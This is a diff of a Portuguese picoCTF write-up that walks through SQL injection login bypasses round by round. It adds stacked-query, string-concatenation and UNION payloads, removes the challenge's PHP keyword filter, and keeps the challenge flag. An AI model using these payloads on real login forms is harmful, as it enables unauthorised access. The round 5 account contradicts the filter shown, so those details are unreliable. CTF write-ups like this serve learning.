@@ -56,64 +56,43 @@ SELECT * FROM users WHERE username='admin' /*' AND password='1'
 ```
 O filtro continuou permitindo que a parte da senha fosse ignorada e o login fosse feito com sucesso.
 
+Round 3:
+No terceiro round, a consulta aceitou o uso de ;, que finaliza uma consulta SQL e pode ser usada para iniciar uma nova execução. Testamos esse comportamento para tentar criar uma segunda consulta, mas isso não teve efeito imediato no resultado da aplicação.
 
-
-
-
-
-icoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}
-
-
-
+Entrada:
 ```
-<?php
-session_start();
-
-if (!isset($_SESSION["round"])) {
-    $_SESSION["round"] = 1;
-}
-$round = $_SESSION["round"];
-$filter = array("");
-$view = ($_SERVER["PHP_SELF"] == "/filter.php");
-
-if ($round === 1) {
-    $filter = array("or");
-    if ($view) {
-        echo "Round1: ".implode(" ", $filter)."<br/>";
-    }
-} else if ($round === 2) {
-    $filter = array("or", "and", "like", "=", "--");
-    if ($view) {
-        echo "Round2: ".implode(" ", $filter)."<br/>";
-    }
-} else if ($round === 3) {
-    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
-    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
-    if ($view) {
-        echo "Round3: ".implode(" ", $filter)."<br/>";
-    }
-} else if ($round === 4) {
-    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
-    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
-    if ($view) {
-        echo "Round4: ".implode(" ", $filter)."<br/>";
-    }
-} else if ($round === 5) {
-    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
-    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
-    if ($view) {
-        echo "Round5: ".implode(" ", $filter)."<br/>";
-    }
-} else if ($round >= 6) {
-    if ($view) {
-        highlight_file("filter.php");
-    }
-} else {
-    $_SESSION["round"] = 1;
-}
-
-// picoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}
-?>
+Usuário: admin';
+Senha: qualquercoisa
 ```
+```
+SELECT * FROM users WHERE username='admin';' AND password='123'
+```
+O uso do ; separou as duas partes da consulta, mas a aplicação não alterou a execução.
+
+Round 4:
+Nesse round, testamos um método diferente de injeção, tentando usar a concatenação para formar o nome de usuário "admin". Isso foi feito com a utilização de ||, que permite a junção de strings em consultas SQL.
+
+Entrada:
+```
+Usuário: ad'||'min';
+Senha: qualquercoisa
+```
+```
+SELECT * FROM users WHERE username='ad'||'min';' AND password='123'
+```
+A aplicação aceitou a injeção e conseguimos passar para o próximo round.
+
+Round 5:
+Finalmente, no último round, conseguimos usar o comando union para injetar nossa própria consulta SQL e visualizar a flag.
+
+Entrada:
+```
+Usuário: admin' UNION SELECT 1,2,3,4--
+Senha: qualquercoisa
+```
+```
+SELECT * FROM users WHERE username='admin' UNION SELECT 1,2,3,4--'
+```
+Com isso, conseguimos obter a instrução para acessar o filter.php.
 
 > Assim, obtemos a flag `picoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}`  
